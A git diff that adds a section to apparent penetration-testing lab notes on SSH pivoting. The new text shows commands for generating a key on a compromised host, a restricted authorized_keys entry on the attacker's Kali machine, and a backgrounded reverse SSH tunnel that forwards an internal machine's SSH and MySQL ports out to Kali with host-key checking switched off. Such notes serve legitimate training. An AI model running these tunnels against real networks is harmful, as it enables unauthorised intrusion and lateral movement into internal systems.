@@ -53,6 +53,34 @@ ssh -N -R 192.168.119.208:2221:127.0.0.1:3306 kali@192.179.119.208
 sh -N -R 192.168.208.52:5555:127.0.0.1:2221 student@192.168.208.52 -p 2222
 ```
 
+In this example on a compromised host we bind two ports from a machine we want to pivot too (ie. not the compromised host we are running this on) back to our local Kali. We use the UserKnownHostsFile=/dev/null not to save the host key and ignore strict host key checking so we don't get prompted. We also need to generate a key so that we do not enter our password on a host we have compromised.
+
+```
+cd /tmp
+mkdir keys
+cd keys
+ssh-keygen
+/tmp/keys/id_rsa
+cat /tmp/keys/id_rsa.pub
+```
+
+Back on Kali `~/.ssh/authorized_keys`:
+```bash
+command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5pTHcaJRATMWKhwijWAaZHt9xTFghJf0BbHgDaMrXoZL0sesrZjIz01mTtNnyQ189K4MXoWFfNXPnIK4giQifJhlslJQtrgbT9QbKlqr32j617an0IJzNefISN9JA7XxSFBysQ2LcsZ5XKEGJ3GsNBWSDIbWqojtbw+C2O9XzDyUg7DnQYgiHnNwR1fAI1ZW/cHQwcR5LU0Rrel9lqSmzqaNCcNat7sbmO9dHOXJSlXUWgJw+UazyCWuDUG9tNBkFABhCCrV6GrlAOmoHwTzj3KjrfO5IFIu+sPcWxqyczR5FOnqnIh7A78aJmv8UFHfHABpBZElPU9TCrCQ1U2wl www-data@ajla
+```
+
+Back on the pivot host:
+```bash
+ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@192.168.119.140
+```
+
+Verify success by checking the ports with netstat on Kali:
+```bash
+sudo netstat -tulpn  
+```
+
+If the shell dies, it doesn't matter as we have backgrounded the connection for SSH and it will continue.
+
 Dynamic Port Forwarding using SSH:
 
 ```bash
